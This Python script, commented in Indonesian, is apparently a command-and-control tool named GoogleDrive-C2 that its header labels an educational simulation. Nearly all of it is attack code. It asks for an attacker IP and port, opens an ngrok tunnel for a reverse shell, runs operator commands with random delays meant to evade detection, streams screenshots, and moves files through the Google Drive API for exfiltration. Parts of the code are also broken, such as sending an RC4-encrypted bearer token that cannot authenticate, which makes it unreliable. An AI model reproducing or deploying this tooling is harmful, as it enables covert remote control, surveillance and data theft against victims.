# Script ini mengintegrasikan API Google Drive untuk berkomunikasi antara sistem yang disusupi
# dan server yang dikendalikan oleh penyerang. Script ini bertujuan sebagai simulasi dan
# hanya untuk tujuan edukasi.
# pip install -r requirements.txt
# python3 GoogleDrive-C2.py

print('''\033[94m 
 #####                                     ######                                #####   #####  
#     #  ####   ####   ####  #      ###### #     # #####  # #    # ######       #     # #     # 
#       #    # #    # #    # #      #      #     # #    # # #    # #            #             # 
#  #### #    # #    # #      #      #####  #     # #    # # #    # #####  ##### #        #####  
#     # #    # #    # #  ### #      #      #     # #####  # #    # #            #       #       
#     # #    # #    # #    # #      #      #     # #   #  #  #  #  #            #     # #       
 #####   ####   ####   ####  ###### ###### ######  #    # #   ##   ######        #####  #######           
\033[0m''')

# Mengimpor library yang dibutuhkan
import subprocess
import time
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import ARC4
import secrets

# Warna untuk output terminal
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Fungsi untuk menghasilkan kunci acak dengan panjang tertentu
def generate_random_key(length):
    return secrets.token_bytes(length)

# Fungsi untuk meminta informasi IP dari penyerang
def get_attacker_info():
    attacker_ip = input("[+] Enter the IP for the reverse shell: ")
    return attacker_ip

# Fungsi untuk mengenkripsi token akses menggunakan algoritma RC4
def encrypt_access_token(token, key_length):
    key = generate_random_key(key_length)  # Membuat kunci RC4
    cipher = ARC4.new(key)  # Membuat objek cipher RC4
    encrypted_token = cipher.encrypt(token.encode())  # Mengenkripsi token
    return base64.b64encode(encrypted_token).decode()  # Mengembalikan token terenkripsi dalam Base64

# Fungsi utama
def main():
    try:
        # Meminta token akses Google Drive API dari pengguna
        access_token = input("[+] Enter your Google Drive API access token: ")
        ip = get_attacker_info()  # Meminta IP dari penyerang
        port = input("[+] Enter the port number for the reverse shell and ngrok: ")
        key_length = int(input("[+] Enter the length of the RC4 key (in bytes): "))

        print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
        # Menjalankan ngrok untuk membuat tunnel TCP
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
        time.sleep(3)  # Memberikan waktu untuk ngrok agar aktif

        # Mengenkripsi token akses menggunakan RC4
        access_token_encrypted = encrypt_access_token(access_token, key_length)

        # Header untuk permintaan API Google Drive
        headers = {
            "Authorization": f"Bearer {access_token_encrypted}",
            "Content-Type": "application/json",
            "User-Agent": "GoogleDrive-API-Client/1.0",
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"
        }

        # Membuat socket untuk komunikasi
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))  # Mengikat socket ke IP dan port
        s.listen(1)  # Mendengarkan koneksi masuk
        print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
        client_socket, addr = s.accept()  # Menerima koneksi dari klien

        # Menjalankan shell interaktif
        shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        # Memulai tampilan virtual
        display = Display(visible=0, size=(800, 600))
        display.start()

        # Loop utama untuk menerima perintah dan mengeksekusinya
        while True:
            command = input(RED + "Enter a command to execute (or type 'exit' to quit): " + RESET)
            if command.lower() == "exit":
                break
            
            # Delay acak untuk menghindari pola yang dapat dideteksi
            time.sleep(random.uniform(1, 5))
            
            # Menjalankan perintah
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout  # Output perintah
            stderr = result.stderr  # Error dari perintah
            
            client_socket.send(command.encode())  # Mengirim perintah ke klien
            client_socket.send(stdout.encode())  # Mengirim output perintah
            client_socket.send(stderr.encode())  # Mengirim error perintah

            # Perintah khusus untuk menangkap layar
            if command.lower() == "screen":
                screen = pyautogui.screenshot()  # Mengambil tangkapan layar
                screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                client_socket.send(screen_data.encode())  # Mengirim data tangkapan layar

                while True:
                    try:
                        screen = pyautogui.screenshot()  # Mengambil tangkapan layar
                        screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                        client_socket.send(screen_data.encode())  # Mengirim tangkapan layar
                        time.sleep(0.1)
                    except KeyboardInterrupt:
                        print("\nScreen session ended.")
                        break

            # Perintah untuk mengunggah file ke Google Drive
            elif command.lower() == "upload":
                file_path = input("Enter the path of the file to upload: ")
                file_name = os.path.basename(file_path)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                url = "https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
                response = requests.post(url, headers=headers, data=file_data)
                client_socket.send(response.text.encode())  # Mengirim respons dari API

            # Perintah untuk mengunduh file dari Google Drive
            elif command.lower() == "download":
                file_path = input("Enter the path of the file to download: ")
                url = f"https://www.googleapis.com/drive/v3/files/{file_path}?alt=media"
                response = requests.get(url, headers=headers)
                with open(os.path.basename(file_path), "wb") as f:
                    f.write(response.content)
                client_socket.send("File downloaded successfully.".encode())

            # Perintah untuk menampilkan daftar file di Google Drive
            elif command.lower() == "list_files":
                url = "https://www.googleapis.com/drive/v3/files"
                response = requests.get(url, headers=headers)
                client_socket.send(response.text.encode())

            else:
                client_socket.send(stdout.encode())  # Mengirim output perintah
                client_socket.send(stderr.encode())  # Mengirim error perintah

        # Menutup koneksi dan proses
        client_socket.close()
        s.close()
        display.stop()
        ngrok_process.terminate()

    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

if __name__ == "__main__":
    main()
